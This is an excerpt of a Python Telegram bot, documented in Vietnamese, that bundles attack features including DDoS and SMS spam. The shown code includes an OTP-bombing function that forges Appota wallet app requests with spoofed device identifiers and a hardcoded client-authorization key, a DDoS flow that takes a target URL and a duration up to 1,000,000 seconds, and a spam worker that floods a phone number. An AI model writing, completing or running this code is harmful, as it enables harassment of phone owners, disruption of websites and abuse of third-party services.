#!/usr/bin/env python3
"""
Bot Tích hợp đầy đủ: Proxy, XWorld, Game, DDOS, Scan LQ, Spam SMS, Admin, Bank, Antispam
"""
...
#!/usr/bin/env python3
"""
Bot Tích hợp: Proxy, XWorld, Game, DDOS, Scan LQ, Spam SMS, Admin, Bank, Antispam
"""
import os, asyncio, tempfile, logging, threading, concurrent.futures, time, re, json, random
from datetime import date
from urllib.parse import urlparse
...
def send_otp_via_APPOTA(sdt):
    r1 = requests.post('https://mobile.useinsider.com/api/v3/session/start', json={"insider_id":rand_id(),"partner_name":"appotapay","reason":"default","udid":rand_id(),"device_info":{"location_enabled":False,"app_version":"5.2.10","push_enabled":True,"os_version":"17.0.2","battery":90,"sdk_version":"13.4.3-RN-6.4.4-nh","connection":"wifi"}}, headers={'User-Agent':'appota_wallet_v2/119','Content-Type':'application/json','ts':'1722417438'})
    h2 = {'User-Agent':'appota_wallet_v2/119','Content-Type':'application/json','client-version':'5.2.10','aw-device-id':rand_device(),'language':'vi','client-authorization':'GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP','x-device-id':rand_device(),'x-client-build':'119','x-client-version':'5.2.10','platform':'ios','x-client-platform':'ios','ref-client':'appwallet','x-request-id':'3643ec43-20c4-446d-b3b0-0ac86adf5528','x-request-ts':'1722417439'}
...
async def ddos_input_duration(update, context, threads):
    ...
    await update.message.reply_text("Nhập thời gian (giây, 1-1000000):")
...
async def spam_worker(chat_id, phone, count, context):
    ...
    if not ev.is_set():
        await context.bot.send_message(chat_id, "✅ Hoàn thành spam!")
...
async def handle_text(update, context):
    ...
    if "expect_ddos" in context.user_data:
        ...
        if state == 'url':
            ...
            try: dur = int(txt); assert 1 <= dur <= 1000000
            except: await update.message.reply_text("❌ 1-10,00,000"); return
    ...
    await update.message.reply_text("Gõ /menu để mở bảng điều khiển.")
...
async def menu_command(update, context):
    ...
    if is_blacklisted(uid): return
    if not check_antispam(uid): return
    await update.message.reply_text("🤖 *Menu chính*", parse_mode='Markdown', reply_markup=main_menu_keyboard())
